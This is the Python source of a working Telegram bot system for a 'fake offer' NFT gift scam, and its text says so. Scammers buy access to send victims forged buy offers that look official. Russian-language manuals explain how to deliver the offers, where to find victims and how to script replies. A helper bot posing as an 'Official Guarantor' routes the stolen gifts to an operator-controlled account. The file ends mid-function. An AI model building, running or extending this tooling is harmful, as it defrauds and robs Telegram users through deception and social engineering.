import asyncio
import os
import re
from dotenv import load_dotenv
from aiogram import Bot, Dispatcher
from aiogram.types import (
    CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup, Message,
    InlineQuery, InlineQueryResultArticle, InputTextMessageContent, FSInputFile, InputMediaPhoto
)
from aiogram.filters import Command, CommandObject
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
import database as db

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN", "").strip()
HELPER_BOT_TOKEN = os.getenv("HELPER_BOT_TOKEN", "").strip()
if not BOT_TOKEN:
    raise RuntimeError("Укажите BOT_TOKEN в .env")
if not HELPER_BOT_TOKEN:
    raise RuntimeError("Укажите HELPER_BOT_TOKEN в .env")

bot = Bot(BOT_TOKEN)
dp = Dispatcher()

helper_bot = Bot(HELPER_BOT_TOKEN)
helper_dp = Dispatcher()

ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip().isdigit()]

TON_WALLET = os.getenv("TON_WALLET", "").strip() or "Не указан в .env"

UNIFIED_NFT_TARGET = (
    os.getenv("MARKET_BANK_USERNAME")
    or os.getenv("FREE_TARGET_USERNAME")
    or "@mkt_vault"
).strip() or "@mkt_vault"

FREE_TARGET_USERNAME = UNIFIED_NFT_TARGET
MARKET_BANK_USERNAME = UNIFIED_NFT_TARGET
MARKET_BRAND_NAME = os.getenv("MARKET_BRAND_NAME", "MKT Vault").strip() or "MKT Vault"
CONTACT_USERNAME = os.getenv("CONTACT_USERNAME", UNIFIED_NFT_TARGET).strip() or UNIFIED_NFT_TARGET

CHANNEL_URL = os.getenv("CHANNEL_URL", "https://t.me/fakescmoffers").strip()
CHANNEL_ID = os.getenv("CHANNEL_ID", "@fakescmoffers").strip()
HELPER_BANNER_PATH = os.getenv("HELPER_BANNER_PATH", "helper_banner.jpg").strip()

E_STAR, E_TON, E_GIFT, E_FREE = "5242491550272882089", "5240059263048517877", "6032937473162614352", "5116382939571028928"
E_CHECK, E_CROSS, E_LIGHT = "5776375003280838798", "5778527486270770928", "5085022089103016925"

LOCALIZATIONS = {
    "ru": {
        "offer_text": "Пользователь <b>{name}</b> предлагает Вам <b>{price}</b> {icon} за предмет <a href=\"{link}\"><b>{item_title}</b></a>\n\n<b>Предложение действует ещё 6 ч. 0 мин.</b>",
        "btn_accept": "Принять", "btn_dec": "Отклонить", "btn_transfer": "Передать NFT", "btn_confirm": "Подтвердить передачу",
        "accepted_alert": "⚠️ Звёзды внесены в систему Telegram. Передайте NFT в течение 30 минут.",
        "confirm_alert": "⚠️ Сначала передайте NFT, а затем подтверждайте.",
        "success_title": "Коллекционный предмет: <b>{item_title}</b> успешно продан!",
        "success_desc": "Передайте коллекционный предмет получателю зачисления Stars.", "declined": "❌ Предложение отклонено."
    },
    "en": {
        "offer_text": "User <b>{name}</b> offers you <b>{price}</b> {icon} for <a href=\"{link}\"><b>{item_title}</b></a>\n\n<b>Valid for 6h 0m.</b>",
        "btn_accept": "Accept", "btn_dec": "Decline", "btn_transfer": "Transfer NFT", "btn_confirm": "Confirm",
        "accepted_alert": "⚠️ Stars credited. Transfer NFT within 30 mins.",
        "confirm_alert": "⚠️ Transfer NFT first.", "success_title": "Item <b>{item_title}</b> sold!",
        "success_desc": "Transfer item to recipient.", "declined": "❌ Declined."
    },
    "ua": {
        "offer_text": "Користувач <b>{name}</b> пропонує <b>{price}</b> {icon} за предмет <a href=\"{link}\"><b>{item_title}</b></a>\n\n<b>Діє ще 6 год.</b>",
        "btn_accept": "Прийняти", "btn_dec": "Відхилити", "btn_transfer": "Передати NFT", "btn_confirm": "Підтвердити",
        "accepted_alert": "⚠️ Зірки внесені. Передайте NFT протягом 30 хв.",
        "confirm_alert": "⚠️ Спочатку передайте NFT.", "success_title": "Предмет <b>{item_title}</b> продано!",
        "success_desc": "Передайте предмет одержувачу.", "declined": "❌ Відхилено."
    }
}

class SupportState(StatesGroup):
    waiting_message = State()

ADMIN_COMMANDS_TEXT = (
    "🛠 <b>Панель администратора — список функций:</b>\n\n"
    "• <code>/give ID</code> — выдать доступ и снять принудительную цель\n"
    "• <code>/take ID</code> — отозвать доступ у пользователя\n"
    "• <code>/force_target ID @юз</code> — принудительно задать цель в БД\n"
    "• <code>/unforce ID</code> — снять блокировку смены получателя\n"
    "• <code>/users</code> — посмотреть общее количество пользователей\n"
    "• <code>/say текст</code> — рассылка текста или фото (приложите фото или ответьте на фото)\n"
    "• <code>/admin_help</code> — показать этот список команд\n"
    "• Обращения через <code>/support</code> приходят сюда автоматически"
)

USER_SUPPORT_HINT = (
    "💬 Если у вас спамблок или возник вопрос — напишите <code>/support ваш текст</code>, "
    "и сообщение сразу уйдёт администраторам."
)

SUB_REQUIRED_TEXT = (
    "📢 <b>Для работы с ботом необходимо подписаться на наш ТГК:</b>\n"
    f"{CHANNEL_URL}\n\n"
    "После подписки нажмите кнопку <b>«Проверить»</b>."
)

MANUAL_HOME_TEXT = (
    "📖 <b>МАНУАЛ ДЛЯ ФЕЙК ОФФЕРОВ</b>\n\n"
    "<b>ЖМИТЕ КНОПКИ СНИЗУ</b>"
)

MANUAL_AUTO_TEXT = (
    "📘 <b>Гайд на фейк оффера через автоматизацию чата</b>\n\n"
    "1️⃣ Добавьте бота в автоматизацию чатов:\n"
    "<b>Профиль → автоматизация чатов</b> и добавляете бота <b>@HelperTransferNftBot</b>\n\n"
    "2️⃣ Вы и ваш мамонт должны добавить друг друга в контакты (можно не показывая свой номер)\n\n"
    "3️⃣ Кидаете сам оффер, шаблон ниже:\n"
    "<code>/h ссылка_нфт цена валюта язык</code>\n\n"
    "‼️ <b>Если оффер удаляется — значит вы не добавили в контакты друг друга</b> ‼️\n\n"
    "<b>Языки:</b>\n"
    "• <code>ru</code> — русский\n"
    "• <code>en</code> — английский\n"
    "• <code>ua</code> — украинский\n\n"
    "‼️ <b>Пишите в поддержку если хотите, чтобы мы добавили новые языки</b> ‼️"
)

MANUAL_VIA_TEXT = (
    "📗 <b>Гайд на фейк оффера через via</b>\n\n"
    "1️⃣ Найдите и нажмите старт в боте <b>@HelperNftGiftTransferBot</b>\n\n"
    "2️⃣ Зайдите в лс с мамонтом и отправьте оффер, шаблон ниже:\n"
    "<code>@HelperNftGiftTransferBot ссылка_нфт цена валюта язык</code>\n\n"
    "3️⃣ После у вас всплывает окно с созданием оффера, нажмите на него\n\n"
    "‼️ <b>Добавлять в контакты не обязательно</b> ‼️\n\n"
    "<b>Языки:</b>\n"
    "• <code>ru</code> — русский\n"
    "• <code>en</code> — английский\n"
    "• <code>ua</code> — украинский\n\n"
    "‼️ <b>Пишите в поддержку если хотите, чтобы мы добавили новые языки</b> ‼️"
)

MANUAL_PARSERS_TEXT = (
    "🔎 <b>Бесплатные парсеры для поиска мамонта:</b>\n\n"
    "➡️ <b>@ParserWWGiftBot</b> (бот в тг)\n"
    "➡️ <b>Peek.tg</b> (сайт)"
)

MANUAL_TIPS_TEXT = (
    "💡 <b>Советы по использованию бота и общения с мамонтом</b>\n\n"
    "‼️ <b>Настоятельно рекомендуем выключать бота из автоматизации пока не воркаете, "
    "если не хотите получить заморозку/бан/слёт сессий</b> ‼️\n\n"
    "‼️ <b>Также желательно иметь премиум, чтобы оффера были более похожи на официальные</b> ‼️\n\n"
    "1️⃣ <b>Что ответить, если мамонт спрашивает для чего добавлять в контакты?</b>\n"
    "<blockquote>Привет! Не хочу, чтобы мне опять дали спамблок за то что пишу не контактам</blockquote>\n\n"
    "2️⃣ <b>Что ответить, если мамонт говорит или спрашивает почему через бота оффер?</b>\n"
    "<blockquote>Привет! Не хочу ждать 2 недели после передачи нфт, плюсом тебе же лучше, "
    "не будет комиссии за передачу нфт. Звёзды будут храниться в боте, "
    "ознакомиться подробнее можешь в @HelperNftGiftTransferBot</blockquote>"
)

def kb(buttons):
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def sub_kb():
    return kb([
        [InlineKeyboardButton(text="📢 Подписаться", url=CHANNEL_URL, icon_custom_emoji_id=E_LIGHT)],
        [InlineKeyboardButton(text="✅ Проверить", callback_data="check_sub", icon_custom_emoji_id=E_CHECK)]
    ])

def ready_menu_kb():
    return kb([
        [InlineKeyboardButton(text="📚 Мануал", callback_data="open_manual", icon_custom_emoji_id=E_LIGHT)],
        [InlineKeyboardButton(text="📢 Наш ТГК", url=CHANNEL_URL, icon_custom_emoji_id=E_LIGHT)],
        [InlineKeyboardButton(text="💎 Тарифы", callback_data="show_tariffs", icon_custom_emoji_id=E_TON)]
    ])

def manual_menu_kb():
    return kb([
        [InlineKeyboardButton(text="1️⃣ Способ через Автоматизацию чата", callback_data="manual_auto", icon_custom_emoji_id=E_LIGHT)],
        [InlineKeyboardButton(text="2️⃣ Способ через via", callback_data="manual_via", icon_custom_emoji_id=E_LIGHT)],
        [InlineKeyboardButton(text="🔎 Фри парсера", callback_data="manual_parsers", icon_custom_emoji_id=E_LIGHT)],
        [InlineKeyboardButton(text="💡 Советы", callback_data="manual_tips", icon_custom_emoji_id=E_LIGHT)],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_menu", icon_custom_emoji_id=E_CROSS)]
    ])

def manual_back_kb():
    return kb([
        [InlineKeyboardButton(text="🔙 К мануалу", callback_data="open_manual", icon_custom_emoji_id=E_CROSS)]
    ])

def buy_kb():
    return kb([
        [InlineKeyboardButton(text="Free (60/40)", callback_data="buy_free", icon_custom_emoji_id=E_FREE)],
        [InlineKeyboardButton(text="4 TON / 250 ⭐ (80/20)", callback_data="buy_4ton", icon_custom_emoji_id=E_TON)],
        [InlineKeyboardButton(text="6 TON / 500 ⭐ (100%)", callback_data="buy_6ton", icon_custom_emoji_id=E_TON)],
        [InlineKeyboardButton(text="📚 Мануал", callback_data="open_manual", icon_custom_emoji_id=E_LIGHT)],
        [InlineKeyboardButton(text="📢 Наш ТГК", url=CHANNEL_URL, icon_custom_emoji_id=E_LIGHT)],
        [InlineKeyboardButton(text="Платный доступ за просмотры в tiktok", callback_data="buy_tiktok", icon_custom_emoji_id=E_LIGHT)]
    ])

async def check_sub(uid: int) -> bool:
    try:
        m = await bot.get_chat_member(chat_id=CHANNEL_ID, user_id=uid)
        if m.status in ["creator", "administrator", "member"]:
            return True
        if m.status == "restricted":
            return bool(getattr(m, "is_member", False))
        return False
    except Exception as e:
        print(f"Ошибка проверки подписки для {uid}: {e}")
        return False

async def build_home_view(uid: int):
    is_paid = uid in ADMIN_IDS or await asyncio.to_thread(db.check_paid, uid)
    if uid in ADMIN_IDS:
        text = f"👑 <b>Бот готов!</b>\n\n{ADMIN_COMMANDS_TEXT}\n\n{USER_SUPPORT_HINT}"
    elif is_paid:
        text = f"❄️ <b>Бот готов!</b>\n\n{USER_SUPPORT_HINT}"
    else:
        text = f"🍀 <b>Выберите тариф:</b>\n\n{USER_SUPPORT_HINT}"
    markup = ready_menu_kb() if is_paid else buy_kb()
    return text, markup

async def send_support_to_admins(msg: Message, request_text: str):
    user = msg.from_user
    uname = f"@{user.username}" if user and user.username else "нет юзернейма"
    uid = user.id if user else 0
    full_name = user.full_name if user else "Пользователь"
    admin_text = (
        "📩 <b>Новое обращение в /support</b>\n"
        f"👤 <b>От:</b> <a href='tg://user?id={uid}'>{full_name}</a> ({uname})\n"
        f"🆔 <b>ID:</b> <code>{uid}</code>\n\n"
        f"<blockquote>{request_text}</blockquote>"
    )
    for aid in ADMIN_IDS:
        try:
            await bot.send_message(aid, admin_text, parse_mode="HTML")
        except:
            pass

@dp.message.outer_middleware()
async def subscription_message_middleware(handler, event: Message, data: dict):
    if not event.from_user:
        return
    uid = event.from_user.id
    text = (event.text or "").strip()

    if text == "/support" or text.startswith("/support ") or text.startswith("/support@"):
        return await handler(event, data)

    state: FSMContext | None = data.get("state")
    if state and await state.get_state() == SupportState.waiting_message.state:
        return await handler(event, data)

    if not await check_sub(uid):
        await event.answer(SUB_REQUIRED_TEXT, reply_markup=sub_kb(), parse_mode="HTML")
        return

    return await handler(event, data)

@dp.callback_query.outer_middleware()
async def subscription_callback_middleware(handler, event: CallbackQuery, data: dict):
    if not event.from_user:
        return
    if event.data == "check_sub" or (event.data and event.data.startswith(("acc_", "dec_", "confirm_"))):
        return await handler(event, data)

    if not await check_sub(event.from_user.id):
        await event.answer("❌ Сначала подпишитесь на канал!", show_alert=True)
        if event.message:
            try:
                await event.message.edit_text(SUB_REQUIRED_TEXT, reply_markup=sub_kb(), parse_mode="HTML")
            except:
                pass
        return

    return await handler(event, data)
@dp.message(Command("admin_help"))
async def cmd_admin_help(msg: Message):
    if not msg.from_user or msg.from_user.id not in ADMIN_IDS:
        return
    await msg.answer(ADMIN_COMMANDS_TEXT, parse_mode="HTML")

@dp.message(Command("give"))
async def cmd_give(msg: Message, command: CommandObject):
    if not msg.from_user or msg.from_user.id not in ADMIN_IDS or not command.args or not command.args.strip().isdigit():
        return
    uid = int(command.args.strip())
    await asyncio.to_thread(db.set_paid, uid)
    await asyncio.to_thread(db.remove_forced_target, uid)
    await msg.answer(f"✅ Доступ выдан <code>{uid}</code>", parse_mode="HTML")
    try:
        await bot.send_message(uid, f"🎉 Доступ активирован!\n\n{USER_SUPPORT_HINT}", reply_markup=ready_menu_kb(), parse_mode="HTML")
    except:
        pass

@dp.message(Command("take"))
async def cmd_take(msg: Message, command: CommandObject):
    if not msg.from_user or msg.from_user.id not in ADMIN_IDS or not command.args or not command.args.strip().isdigit():
        return
    uid = int(command.args.strip())
    await asyncio.to_thread(db.remove_paid, uid)
    await msg.answer(f"❌ Доступ отозван у <code>{uid}</code>", parse_mode="HTML")
    try:
        await bot.send_message(uid, f"⚠️ Ваш доступ к боту был отозван администратором.\n\n{USER_SUPPORT_HINT}", parse_mode="HTML")
    except:
        pass

@dp.message(Command("force_target"))
async def cmd_force(msg: Message, command: CommandObject):
    if not msg.from_user or msg.from_user.id not in ADMIN_IDS:
        return
    args = (command.args or "").split()
    if len(args) < 2 or not args[0].isdigit():
        return
    uid, target = int(args[0]), args[1]
    await asyncio.to_thread(db.set_target_user, uid, target)
    await asyncio.to_thread(db.add_forced_target, uid)
    await msg.answer(
        f"🔒 В БД записана цель для <code>{uid}</code>: <b>{target}</b>\n"
        f"<i>Примечание: все выдачи NFT в офферах принудительно идут на {UNIFIED_NFT_TARGET}.</i>",
        parse_mode="HTML"
    )

@dp.message(Command("unforce"))
async def cmd_unforce(msg: Message, command: CommandObject):
    if not msg.from_user or msg.from_user.id not in ADMIN_IDS or not command.args or not command.args.strip().isdigit():
        return
    uid = int(command.args.strip())
    await asyncio.to_thread(db.remove_forced_target, uid)
    await msg.answer(f"🔓 Блокировка с <code>{uid}</code> снята", parse_mode="HTML")

@dp.message(Command("users"))
async def cmd_users(msg: Message):
    if not msg.from_user or msg.from_user.id not in ADMIN_IDS:
        return
    users = await asyncio.to_thread(db.get_all_users)
    await msg.answer(f"👥 Всего юзеров: <code>{len(users)}</code>", parse_mode="HTML")

@dp.message(Command("say"))
async def cmd_say(msg: Message, command: CommandObject):
    if not msg.from_user or msg.from_user.id not in ADMIN_IDS:
        return

    raw_args = (command.args or "").strip()
    photo_id = None
    text = raw_args

    if msg.photo:
        photo_id = msg.photo[-1].file_id
        if not text and msg.caption:
            text = re.sub(r"^/say(?:@\w+)?\s*", "", msg.caption, flags=re.IGNORECASE).strip()
    elif msg.reply_to_message and msg.reply_to_message.photo:
        photo_id = msg.reply_to_message.photo[-1].file_id
        if not text:
            text = (msg.reply_to_message.caption or "").strip()

    if not photo_id and not text:
        return await msg.answer(
            "❌ Напиши <code>/say текст</code>, прикрепи фото к <code>/say текст</code> "
            "или ответь командой <code>/say текст</code> на фото.",
            parse_mode="HTML"
        )

    users = await asyncio.to_thread(db.get_all_users)
    sent = 0
    failed = 0
    status = await msg.answer(f"⏳ Рассылка для {len(users)} юзеров...")

    for uid in users:
        try:
            if photo_id:
                await bot.send_photo(
                    chat_id=uid,
                    photo=photo_id,
                    caption=text or None,
                    parse_mode="HTML" if text else None
                )
            else:
                await bot.send_message(
                    chat_id=uid,
                    text=text,
                    parse_mode="HTML"
                )
            sent += 1
            await asyncio.sleep(0.03)
        except Exception:
            failed += 1

    await status.edit_text(
        f"✅ Рассылка завершена.\n"
        f"Отправлено: <b>{sent}</b> | Не доставлено: <b>{failed}</b>",
        parse_mode="HTML"
    )

@dp.message(Command("set_target"))
async def cmd_set_target(msg: Message, command: CommandObject):
    if not msg.from_user:
        return
    uid = msg.from_user.id
    is_admin = uid in ADMIN_IDS
    if not (is_admin or await asyncio.to_thread(db.check_paid, uid)):
        return await msg.answer("❌ Нет доступа.")
    if not is_admin and await asyncio.to_thread(db.is_forced_target, uid):
        return await msg.answer("❌ Изменение заблокировано админом.")
    if not command.args:
        return await msg.answer("❌ Использование: /set_target @username")
    target = command.args.strip()
    if is_admin:
        await asyncio.to_thread(db.remove_forced_target, uid)
    await asyncio.to_thread(db.set_target_user, uid, target)
    await msg.answer(
        f"✅ Настройка сохранена: <b>{target}</b>\n"
        f"<i>NFT в офферах для всех пользователей направляются на {UNIFIED_NFT_TARGET}.</i>",
        parse_mode="HTML"
    )

@dp.message(Command("support"))
async def cmd_support(msg: Message, command: CommandObject, state: FSMContext):
    if msg.chat.type != "private":
        return
    req = (command.args or "").strip()
    if not req:
        await state.set_state(SupportState.waiting_message)
        return await msg.answer(
            "✍️ Напишите ваше сообщение или просьбу (например, при спамблоке) одним сообщением — я передам его администраторам:",
            parse_mode="HTML"
        )
    await send_support_to_admins(msg, req)
    await msg.answer("✅ Ваша просьба отправлена администраторам! Ожидайте ответа.", parse_mode="HTML")

@dp.message(SupportState.waiting_message)
async def process_support_message(msg: Message, state: FSMContext):
    req = (msg.text or "").strip()
    await state.clear()
    if not req:
        return await msg.answer("❌ Пустое сообщение не отправлено. Введите <code>/support ваш текст</code>.", parse_mode="HTML")
    await send_support_to_admins(msg, req)
    await msg.answer("✅ Ваша просьба отправлена администраторам! Ожидайте ответа.", parse_mode="HTML")

@dp.message(Command("start"))
async def start(msg: Message, command: CommandObject):
    if not msg.from_user:
        return
    uid = msg.from_user.id
    if command.args and command.args.startswith("ref_"):
        try:
            await asyncio.to_thread(db.add_referral, int(command.args.split("_")[1]), uid)
        except:
            pass
    await asyncio.to_thread(db.add_user, uid)
    text, markup = await build_home_view(uid)
    await msg.answer(text, reply_markup=markup, parse_mode="HTML")

@dp.callback_query(lambda c: c.data == "check_sub")
async def verify_sub(call: CallbackQuery):
    if not call.from_user:
        return
    uid = call.from_user.id
    if not await check_sub(uid):
        return await call.answer("❌ Вы не подписаны на канал!", show_alert=True)
    await asyncio.to_thread(db.add_user, uid)
    await call.answer("✅ Подписка подтверждена!", show_alert=False)
    text, markup = await build_home_view(uid)
    if call.message:
        await call.message.edit_text(text, reply_markup=markup, parse_mode="HTML")

@dp.callback_query(lambda c: c.data in [
    "open_manual", "manual_auto", "manual_via", "manual_parsers", "manual_tips",
    "buy_free", "buy_4ton", "buy_6ton", "buy_tiktok", "back_to_menu", "show_tariffs"
])
async def menu_callbacks(call: CallbackQuery):
    await call.answer()
    if not call.from_user or not call.message:
        return
    uid, data = call.from_user.id, call.data
    back_markup = kb([[InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_menu", icon_custom_emoji_id=E_CROSS)]])
    footer_block = f"{USER_SUPPORT_HINT}\n\nПо всем вопросам {UNIFIED_NFT_TARGET}"

    if data == "open_manual":
        await call.message.edit_text(MANUAL_HOME_TEXT, reply_markup=manual_menu_kb(), parse_mode="HTML")
    elif data == "manual_auto":
        await call.message.edit_text(MANUAL_AUTO_TEXT, reply_markup=manual_back_kb(), parse_mode="HTML")
    elif data == "manual_via":
        await call.message.edit_text(MANUAL_VIA_TEXT, reply_markup=manual_back_kb(), parse_mode="HTML")
    elif data == "manual_parsers":
        await call.message.edit_text(MANUAL_PARSERS_TEXT, reply_markup=manual_back_kb(), parse_mode="HTML")
    elif data == "manual_tips":
        await call.message.edit_text(MANUAL_TIPS_TEXT, reply_markup=manual_back_kb(), parse_mode="HTML")
    elif data == "buy_free":
        await asyncio.to_thread(db.set_paid, uid)
        await asyncio.to_thread(db.set_target_user, uid, UNIFIED_NFT_TARGET)
        await asyncio.to_thread(db.add_forced_target, uid)
        free_text = (
            "🆓 <b>Бесплатный доступ (60/40) активирован!</b>\n\n"
            "<b>Как работает?</b> Мамонт переводит NFT на холдер, после NFT продаётся на маркетплейсе, "
            "и вам переводится 60% цены от подарка на криптокошелёк.\n\n"
            f"{footer_block}"
        )
        await call.message.edit_text(free_text, reply_markup=ready_menu_kb(), parse_mode="HTML")
    elif data == "buy_4ton":
        ton4_text = (
            "💎 <b>Тариф 4 TON/250 звёзд (80/20)</b>\n\n"
            f"<code>{TON_WALLET}</code>\n"
            f"Для оплаты звёздами или если вы оплатили криптой писать в тг {UNIFIED_NFT_TARGET}\n\n"
            "<b>Как работает?</b> Мамонт переводит NFT на холдер, после NFT продаётся на маркетплейсе, "
            "и вам переводится 80% цены от подарка на криптокошелёк.\n\n"
            f"{footer_block}"
        )
        await call.message.edit_text(ton4_text, reply_markup=back_markup, parse_mode="HTML")
    elif data == "buy_6ton":
        ton6_text = (
            "💎 <b>Тариф 6 TON/500 звёзд (100%)</b>\n\n"
            f"<code>{TON_WALLET}</code>\n"
            f"Для оплаты звёздами или если вы оплатили криптой писать в тг {UNIFIED_NFT_TARGET}\n\n"
            "<b>Как работает?</b> В боте можно настроить, кому будут приходить NFT от мамонта "
            "(можно использовать для своей команды). Вся стоимость NFT идёт к вам.\n\n"
            f"{footer_block}"
        )
        await call.message.edit_text(ton6_text, reply_markup=back_markup, parse_mode="HTML")
    elif data == "buy_tiktok":
        tiktok_text = (
            "🍀 <b>Как получить платную подписку за 6 тон БЕСПЛАТНО ?</b>\n\n"
            "1️⃣ <b>Опубликуйте видео в TikTok на тему \"скам Нфт/фейк оффера тг\"</b>\n"
            "2️⃣ <b>В описание видео напишите \" лучшие фейк оффера - @fakescmoffers\"</b>\n\n"
            "<b>Условия:</b>\n"
            "• <b>800 просмотров — 12 часов подписки</b>\n"
            "• <b>2000 просмотров - 30 часов подписки</b>\n"
            "• <b>7000+ просмотров - навсегда подписка</b>\n\n"
            "‼️ <b>Использовать продвижение тик ток запрещено</b>\n\n"
            f"{footer_block}"
        )
        await call.message.edit_text(tiktok_text, reply_markup=back_markup, parse_mode="HTML")
    elif data == "back_to_menu":
        text, markup = await build_home_view(uid)
        await call.message.edit_text(text, reply_markup=markup, parse_mode="HTML")
    elif data == "show_tariffs":
        await call.message.edit_text(f"🍀 <b>Выберите тариф:</b>\n\n{USER_SUPPORT_HINT}", reply_markup=buy_kb(), parse_mode="HTML")

def build_transfer_url(target: str) -> str:
    clean_target = (target or "@mkt_vault").strip()
    if clean_target.startswith("tg://user?id="):
        return f"tg://send_gift?to={clean_target.split('=')[-1]}"
    if clean_target.startswith("tg://"):
        return clean_target
    return f"tg://send_gift?to={clean_target.lstrip('@')}"

async def render_offer_result(call: CallbackQuery, bot_instance: Bot):
    if not call.data:
        return
    parts = call.data.split("_", 1)
    if len(parts) < 2:
        return
    action, key = parts[0], parts[1]

    offer = await asyncio.to_thread(db.get_active_offer, key)
    if not offer:
        return await call.answer("❌ Offer expired or bot restarted.", show_alert=True)

    loc = LOCALIZATIONS.get(offer.get("lang", "ru"), LOCALIZATIONS["ru"])

    if action == "confirm":
        await call.answer(loc["confirm_alert"], show_alert=True, cache_time=0)
        return

    if action == "acc":
        await call.answer(loc["accepted_alert"], show_alert=True)
    else:
        await call.answer()

    link = offer.get("link", "https://t.me/nft/")
    title = offer.get("item_title", "Item")

    if action == "acc":
        transfer_url = build_transfer_url(UNIFIED_NFT_TARGET)
        res_txt = (
            f'<a href="{link}">&#8203;</a><tg-emoji emoji-id="{E_GIFT}">🎁</tg-emoji> '
            + loc["success_title"].format(item_title=title)
            + f"\n\n{loc['success_desc']}"
        )
        markup = kb([
            [InlineKeyboardButton(text=loc["btn_transfer"], url=transfer_url, icon_custom_emoji_id=E_GIFT)],
            [InlineKeyboardButton(text=loc["btn_confirm"], callback_data=f"confirm_{key}", icon_custom_emoji_id=E_CHECK)]
        ])
    else:
        res_txt, markup = loc["declined"], None

    preview_options = {"is_disabled": False, "show_above_text": True, "url": link}
    try:
        if call.inline_message_id:
            await bot_instance.edit_message_text(
                inline_message_id=call.inline_message_id,
                text=res_txt,
                reply_markup=markup,
                parse_mode="HTML",
                link_preview_options=preview_options
            )
        elif call.message:
            biz_id = getattr(call.message, "business_connection_id", None)
            kwargs = {
                "chat_id": call.message.chat.id,
                "message_id": call.message.message_id,
                "text": res_txt,
                "reply_markup": markup,
                "parse_mode": "HTML",
                "link_preview_options": preview_options
            }
            if biz_id:
                kwargs["business_connection_id"] = biz_id
            await bot_instance.edit_message_text(**kwargs)
    except Exception as e:
        print(f"Ошибка редактирования оффера: {e}")
  @dp.callback_query(lambda c: c.data and c.data.startswith(("acc_", "dec_", "confirm_")))
async def main_offer_action(call: CallbackQuery):
    await render_offer_result(call, bot)

@dp.business_message()
async def biz_msg(msg: Message):
    text = (msg.text or "").strip()
    if not msg.from_user or not await check_sub(msg.from_user.id):
        return
    if not (msg.from_user.id in ADMIN_IDS or await asyncio.to_thread(db.check_paid, msg.from_user.id)):
        return
    if text.startswith("/h "):
        parts = text.split()
        if len(parts) < 3:
            return
        link, price_str = parts[1], parts[2]
        cur, lang = (parts[3] if len(parts) > 3 else "stars").lower(), (parts[4] if len(parts) > 4 else "ru").lower()
        if lang not in LOCALIZATIONS:
            lang = "ru"

        match = re.search(r"nft/([a-zA-Z0-9]+)-(\d+)", link)
        if not match or not price_str.replace(".", "", 1).isdigit():
            return

        name, num = match.group(1), match.group(2)
        link = link if link.startswith("http") else "https://" + link
        try:
            await bot.delete_business_messages(business_connection_id=msg.business_connection_id, message_ids=[msg.message_id])
        except:
            pass

        title, key = f"{name}#{num}", f"biz_{msg.chat.id}_{asyncio.get_event_loop().time()}"
        preview_link = link if "t.me/nft/" in link else f"https://t.me/nft/{name}-{num}"
        await asyncio.to_thread(db.save_active_offer, key, preview_link, title, msg.from_user.id, lang)

        icon = f'<tg-emoji emoji-id="{E_TON}">💎</tg-emoji>' if "gram" in cur else f'<tg-emoji emoji-id="{E_STAR}">⭐</tg-emoji>'
        loc = LOCALIZATIONS[lang]
        msg_text = f'<a href="{preview_link}">&#8203;</a>' + loc["offer_text"].format(name=msg.from_user.first_name, price=price_str, icon=icon, link=preview_link, item_title=title)

        markup = kb([[
            InlineKeyboardButton(text=loc["btn_dec"], callback_data=f"dec_{key}", icon_custom_emoji_id=E_CROSS),
            InlineKeyboardButton(text=loc["btn_accept"], callback_data=f"acc_{key}", icon_custom_emoji_id=E_CHECK)
        ]])

        await bot.send_message(
            chat_id=msg.chat.id, text=msg_text, reply_markup=markup,
            business_connection_id=msg.business_connection_id, parse_mode="HTML",
            link_preview_options={"is_disabled": False, "show_above_text": True, "url": preview_link}
        )

HELPER_WELCOME_EN = (
    f"🛡 <b>Welcome to the Official Guarantor of Your Deal ({MARKET_BRAND_NAME})</b>\n\n"
    "This service supports safe transfer of collectible NFT gifts "
    "between Telegram users under active marketplace offers.\n\n"
    f"🏛 <b>Bank account:</b> {UNIFIED_NFT_TARGET}\n"
    "Items are routed to the bank account for settlement and confirmation."
)

HELPER_HOW_EN = (
    f"🔄 <b>How the deal works via {MARKET_BRAND_NAME} Bank:</b>\n\n"
    "1. Open the active offer in the chat.\n"
    f"2. Transfer the collectible NFT gift to the bank account ({UNIFIED_NFT_TARGET}).\n"
    "3. Tap <b>Confirm</b> in the offer card to record the transfer."
)

HELPER_RULES_EN = (
    f"🛡 <b>{MARKET_BRAND_NAME} Guarantor rules:</b>\n\n"
    "• Verify the exact NFT name and number in the offer card before sending.\n"
    f"• Send the gift only to the designated bank account ({UNIFIED_NFT_TARGET}).\n"
    "• After sending, tap <b>Confirm</b> in the offer message."
)

HELPER_STATUS_ALERT_EN = (
    "🏦 Deal status is tracked in the offer card. Ensure the NFT was sent to the bank account and confirmed."
)

def helper_main_kb() -> InlineKeyboardMarkup:
    return kb([
        [InlineKeyboardButton(text="How the deal works?", callback_data="hmenu_how", icon_custom_emoji_id=E_LIGHT)],
        [InlineKeyboardButton(text="Guarantor rules", callback_data="hmenu_rules", icon_custom_emoji_id=E_CHECK)],
        [InlineKeyboardButton(text="Check deal status", callback_data="hmenu_status", icon_custom_emoji_id=E_STAR)]
    ])

def helper_back_kb() -> InlineKeyboardMarkup:
    return kb([
        [InlineKeyboardButton(text="🔙 Back", callback_data="hmenu_back", icon_custom_emoji_id=E_CROSS)]
    ])

async def edit_helper_view(call: CallbackQuery, text: str, markup: InlineKeyboardMarkup):
    if not call.message:
        return
    has_banner = bool(HELPER_BANNER_PATH and os.path.isfile(HELPER_BANNER_PATH))
    try:
        if getattr(call.message, "photo", None):
            await call.message.edit_caption(caption=text, reply_markup=markup, parse_mode="HTML")
        elif has_banner:
            await call.message.edit_media(
                media=InputMediaPhoto(media=FSInputFile(HELPER_BANNER_PATH), caption=text, parse_mode="HTML"),
                reply_markup=markup
            )
        else:
            await call.message.edit_text(text=text, reply_markup=markup, parse_mode="HTML")
    except Exception:
        try:
            await call.message.edit_text(text=text, reply_markup=markup, parse_mode="HTML")
        except Exception as e:
            print(f"Ошибка редактирования сообщения хелпера: {e}")

@helper_dp.message(Command("start", "help"))
async def helper_start(msg: Message):
    markup = helper_main_kb()
    if HELPER_BANNER_PATH and os.path.isfile(HELPER_BANNER_PATH):
        photo = FSInputFile(HELPER_BANNER_PATH)
        await msg.answer_photo(
            photo=photo,
            caption=HELPER_WELCOME_EN,
            reply_markup=markup,
            parse_mode="HTML"
        )
    else:
        await msg.answer(
